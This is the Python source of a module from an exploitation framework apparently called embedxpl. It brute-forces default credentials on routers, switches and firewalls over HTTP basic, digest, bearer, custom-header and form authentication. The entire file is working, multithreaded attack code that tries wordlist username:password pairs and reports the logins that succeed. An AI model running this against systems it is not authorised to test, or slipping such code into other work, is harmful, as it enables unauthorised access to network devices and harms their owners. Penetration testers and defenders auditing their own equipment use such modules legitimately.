from requests.auth import HTTPDigestAuth

from embedxpl.core.exploit import *
from embedxpl.core.http.http_client import HTTPClient
from embedxpl.resources import wordlists


class Exploit(HTTPClient):
    __info__ = {
        "name": "HTTP/HTTPS Multi-Auth Default Creds",
        "description": "Module validates multiple HTTP auth methods (basic, digest, bearer, custom headers, form).",
        "authors": (
            "Marcin Bury",
            "André Henrique (@mrhenrike)",
        ),
        "devices": (
            "Routers",
            "Switches",
            "TAPs",
            "FW",
            "NGFW",
        ),
    }

    target = OptIP("", "Target IPv4, IPv6 address or file with ip:port (file://)")
    port = OptPort(80, "Target HTTP/HTTPS port")
    ssl = OptBool(False, "SSL enabled: true/false")
    threads = OptInteger(8, "Number of threads")
    defaults = OptWordlist(wordlists.defaults, "User:Pass or file with default credentials (file://)")
    auth_mode = OptString("basic", "Auth mode: basic/digest/bearer/header/form")
    path = OptString("/", "Target path")
    login_path = OptString("/login", "Form login path")
    user_field = OptString("username", "Form username field")
    pass_field = OptString("password", "Form password field")
    header_name = OptString("X-Auth", "Custom header name for header mode")
    header_template = OptString("{user}:{pass}", "Custom header template with {user} and {pass}")
    bearer_prefix = OptString("Bearer", "Bearer prefix")
    success_regex = OptString("", "Success indicator in response body (optional)")
    stop_on_success = OptBool(True, "Stop on first valid authentication attempt")
    verbosity = OptBool(True, "Display authentication attempts")

    def run(self):
        self.credentials = []
        self.attack()

    def _is_success(self, response):
        if response is None:
            return False
        if response.status_code in (401, 403):
            return False
        if self.success_regex:
            return self.success_regex in response.text
        return response.status_code < 500

    def _request_with_mode(self, username: str, password: str):
        mode = str(self.auth_mode).strip().lower()
        if mode == "digest":
            return self.http_request("GET", self.path, auth=HTTPDigestAuth(username, password))
        if mode == "bearer":
            headers = {"Authorization": "{} {}".format(self.bearer_prefix, password)}
            return self.http_request("GET", self.path, headers=headers)
        if mode == "header":
            header_value = self.header_template.format(**{"user": username, "pass": password})
            return self.http_request("GET", self.path, headers={self.header_name: header_value})
        if mode == "form":
            body = {self.user_field: username, self.pass_field: password}
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            return self.http_request("POST", self.login_path, data=body, headers=headers)
        return self.http_request("GET", self.path, auth=(username, password))

    @multi
    def attack(self):
        print_status("Starting {} auth validation against {}".format(self.auth_mode, self.path))
        data = LockedIterator(self.defaults)
        self.run_threads(self.threads, self.target_function, data)

        if self.credentials:
            print_success("Credentials found!")
            headers = ("Target", "Port", "Service", "AuthMode", "Username", "Password")
            print_table(headers, *self.credentials)
        else:
            print_error("Credentials not found")

    def target_function(self, running, data):
        while running.is_set():
            try:
                username, password = data.next().split(":", 1)
            except StopIteration:
                break

            response = self._request_with_mode(username, password)
            if self._is_success(response):
                self.credentials.append((self.target, self.port, self.target_protocol, self.auth_mode, username, password))
                print_success(
                    "Authentication succeeded - mode={} user='{}'".format(self.auth_mode, username),
                    verbose=self.verbosity,
                )
                if self.stop_on_success:
                    running.clear()
            else:
                print_error(
                    "Authentication failed - mode={} user='{}'".format(self.auth_mode, username),
                    verbose=self.verbosity,
                )

    @mute
    def check(self):
        response = self.http_request("GET", self.path)
        return response is not None

    @mute
    def check_default(self):
        if self.check():
            self.credentials = []
            data = LockedIterator(self.defaults)
            self.run_threads(self.threads, self.target_function, data)
            if self.credentials:
                return self.credentials
        return None